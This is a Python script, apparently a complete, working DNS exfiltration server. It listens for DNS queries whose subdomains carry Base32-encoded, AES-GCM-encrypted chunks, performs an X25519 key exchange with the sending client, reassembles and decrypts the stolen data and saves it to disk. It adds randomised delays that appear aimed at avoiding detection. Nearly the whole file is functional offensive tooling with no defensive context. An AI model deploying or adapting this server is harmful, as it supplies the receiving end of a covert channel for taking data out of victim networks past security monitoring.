#!/usr/bin/env python3
"""
Module Name: server.py

Description: DNS exfiltration server that receives Base32-encoded, AES-GCM encrypted data chunks in DNS queries,
performs ECDH key exchange with a client-supplied ephemeral key, reassembles the full Base32 string,
decodes and decrypts the blob, then writes the plaintext to disk.

Implements Perfect Forward Secrecy by using X25519 key exchange and per-session AES-GCM keys.

Author: John Burns
Date: 2025-05-02
Version: 2.1 (ECDH key negotiation, AES-GCM, Base32 decoding with DNS-safe key chunks)
"""

import os
import threading
import struct
import socket
import base64
import argparse
import logging
import time
import random
from collections import defaultdict

from dnslib import DNSRecord, RR, QTYPE, A
from dotenv import load_dotenv, find_dotenv
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes

# Load environment variables
load_dotenv(find_dotenv())

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('server')

# In-memory session state
fragments_by_id = defaultdict(dict)
expected_chunks = defaultdict(int)
last_seen = defaultdict(lambda: time.time())
shared_keys = {}
client_key_buffers = defaultdict(list)

# === Key Derivation ===
def derive_shared_key(server_private_key, client_pub_bytes):
    client_pub = x25519.X25519PublicKey.from_public_bytes(client_pub_bytes)
    shared_secret = server_private_key.exchange(client_pub)
    return HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b'dns-exfil'
    ).derive(shared_secret)

# === Decrypt payload ===
def decrypt_payload(key, blob):
    nonce = blob[:12]
    ciphertext = blob[12:]
    return AESGCM(key).decrypt(nonce, ciphertext, None)

# === DNS Helpers ===
def parse_dns_query(data):
    offset = 12
    labels = []
    while True:
        length = data[offset]
        if length == 0:
            break
        offset += 1
        labels.append(data[offset:offset+length].decode('ascii'))
        offset += length
    return '.'.join(labels)

# === Handle and track chunks ===
def process_chunk(identifier, index, total, payload, args):
    idx = int(index)
    fragments_by_id[identifier][idx] = payload
    expected_chunks[identifier] = int(total)
    last_seen[identifier] = time.time()
    logger.info(f"[{identifier}] Received chunk {idx+1}/{total}")

    if len(fragments_by_id[identifier]) == int(total):
        logger.info(f"[{identifier}] All chunks received. Reassembling...")
        reassemble_and_save(identifier, args)

# === Assemble and decrypt file ===
def reassemble_and_save(identifier, args):
    fragments = fragments_by_id.pop(identifier)
    full_b32 = ''.join(fragments[i] for i in sorted(fragments))
    padded = full_b32 + '=' * ((8 - len(full_b32) % 8) % 8)

    try:
        encrypted = base64.b32decode(padded.upper())
    except Exception as e:
        logger.error(f"[{identifier}] Base32 decode failed: {e}")
        return

    try:
        key = shared_keys.pop(identifier)
        plaintext = decrypt_payload(key, encrypted)
    except Exception as e:
        logger.error(f"[{identifier}] Decryption failed: {e}")
        return

    os.makedirs(args.output_dir, exist_ok=True)
    path = os.path.join(args.output_dir, f"{identifier}.bin")
    with open(path, 'wb') as f:
        f.write(plaintext)
    logger.info(f"[{identifier}] Saved file: {path}")

# === DNS Response ===
def respond(data, addr, sock):
    try:
        req = DNSRecord.parse(data)
        reply = req.reply()
        reply.add_answer(RR(req.q.qname, QTYPE.A, rdata=A("192.0.2.1"), ttl=60))
        sock.sendto(reply.pack(), addr)
    except Exception as e:
        logger.error(f"Response error: {e}")

# === Main DNS request handler ===
def handle_request(data, addr, sock, args):
    try:
        qname = parse_dns_query(data).rstrip('.')
    except Exception:
        logger.warning("Invalid DNS query")
        return

    if not qname.endswith(args.domain):
        return

    prefix = qname[:-(len(args.domain) + 1)]

    try:
        identifier, index, total, payload = prefix.split('-', 3)
    except ValueError:
        logger.warning(f"Malformed subdomain: {prefix}")
        return

    time.sleep(random.uniform(args.low, args.high) / 1000.0)

    if index == '0' and total == '0':
        client_key_buffers[identifier].extend(payload.split('.'))
        key_b32 = ''.join(client_key_buffers[identifier])
        if len(key_b32) >= 52:  # Base32-encoded 32-byte key needs 52 chars
            padded = key_b32 + '=' * ((8 - len(key_b32) % 8) % 8)
            try:
                pubkey = base64.b32decode(padded.upper())
                shared_keys[identifier] = derive_shared_key(args.server_key, pubkey)
                logger.info(f"[{identifier}] Received ephemeral public key")
            except Exception as e:
                logger.error(f"[{identifier}] Key exchange failed: {e}")
    else:
        process_chunk(identifier, index, total, payload, args)

    respond(data, addr, sock)

# === Cleanup old sessions ===
def cleanup_stale(ttl=600, interval=60):
    while True:
        now = time.time()
        expired = [k for k, t in last_seen.items() if now - t > ttl]
        for k in expired:
            fragments_by_id.pop(k, None)
            expected_chunks.pop(k, None)
            last_seen.pop(k, None)
            shared_keys.pop(k, None)
            client_key_buffers.pop(k, None)
            logger.info(f"[{k}] Session expired and removed.")
        time.sleep(interval)

# === Parse CLI args ===
def get_args():
    parser = argparse.ArgumentParser(description="DNS Exfiltration Server (ECDH + AES-GCM)")
    parser.add_argument('--port', type=int, default=5300)
    parser.add_argument('--output-dir', default='output')
    parser.add_argument('--low', type=int, default=100)
    parser.add_argument('--high', type=int, default=1500)
    parser.add_argument('--domain', default='xf.example.com')
    parser.add_argument('--server-key', default=os.getenv("SERVER_PRIVATE_KEY"), help='Path to X25519 private key')
    return parser.parse_args()

# === Server Entry Point ===
def start_server(args):
    if not args.server_key:
        raise ValueError("Missing server private key path (use CLI or .env)")

    with open(args.server_key, 'rb') as f:
        args.server_key = x25519.X25519PrivateKey.from_private_bytes(f.read())

    threading.Thread(target=cleanup_stale, daemon=True).start()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('', args.port))
    sock.settimeout(1)
    logger.info(f"Listening on UDP/{args.port}...")

    try:
        while True:
            try:
                data, addr = sock.recvfrom(4096)
                threading.Thread(target=handle_request, args=(data, addr, sock, args), daemon=True).start()
            except socket.timeout:
                continue
    except KeyboardInterrupt:
        logger.info("Server stopping.")
    finally:
        sock.close()

if __name__ == '__main__':
    start_server(get_args())
